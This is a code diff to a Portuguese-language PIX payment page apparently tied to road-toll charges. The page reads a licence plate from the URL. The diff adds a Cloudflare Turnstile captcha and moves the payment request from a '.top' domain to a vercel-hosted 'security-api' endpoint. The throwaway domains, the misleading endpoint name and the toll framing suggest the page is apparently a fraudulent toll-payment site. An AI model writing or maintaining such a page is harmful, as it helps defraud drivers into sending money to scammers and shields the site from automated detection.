@@ -1008,6 +1008,8 @@
 
             <!-- PIX content -->
             <div class="pay-content" id="pixContent">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAADTo8-JZiubVi2ip">
+                </div>
                 <button class="btn-gerar-pix" id="btnGerarPix">Gerar Pix</button>
                 <ul class="pay-info">
                     <li><span class="pay-bullet"></span> Pagamento somente à vista</li>
@@ -1204,6 +1206,8 @@
         </div>
     </div>
 
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer>
+    </script>
     <script>
         var params = new URLSearchParams(location.search);
         var plate = (params.get('plate') || '').toUpperCase();
@@ -1259,24 +1263,42 @@
         //function create payment
         var currentTxId = null;
         document.getElementById('btnGerarPix').addEventListener('click', async function () {
+
+            const turnstileToken =
+                document.querySelector(
+                    '[name="cf-turnstile-response"]'
+                )?.value;
+
+            if (!turnstileToken) {
+
+                alert('Complete o captcha');
+
+                return;
+            }
+
             var btn = this;
             btn.disabled = true
             btn.textContent = 'Gerando...'
 
             var payload = {
-                productTitle:'FF00BX',
-                amount: `${amount}`
+                productTitle: 'FF00BX',
+                amount: `${amount}`,
+                turnstileToken
             }
-            const response = await fetch('https://rotasolucoesviagem.top/api/payment/process', {
+            const response = await fetch('https://security-api-one.vercel.app/criar-pix', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             })
 
-            
+
 
             const data = await response.json()
-            console.log(data)
+
+
+
+
+
             if (data.txid) {
                 currentTxId = data.txid;
             }
@@ -1322,6 +1344,12 @@
             setTimeout(function () { self.textContent = 'Copiar'; }, 2000);
         });
 
+
+        if (window.turnstile) {
+
+            window.turnstile.reset();
+
+        }
         let statusInterval = null;
         // function pollStatus() {
         //     if (!currentTxId) return;
@@ -1348,9 +1376,9 @@
         //     }, 3000);
         // }
 
-        document.getElementById('btnFecharModal').addEventListener('click', function(){
+        document.getElementById('btnFecharModal').addEventListener('click', function () {
             document.getElementById('zapayPaidModal').classList.remove('active')
-             window.location.href = 'pedagio.html';
+            window.location.href = 'pedagio.html';
         })
     </script>
 </body>
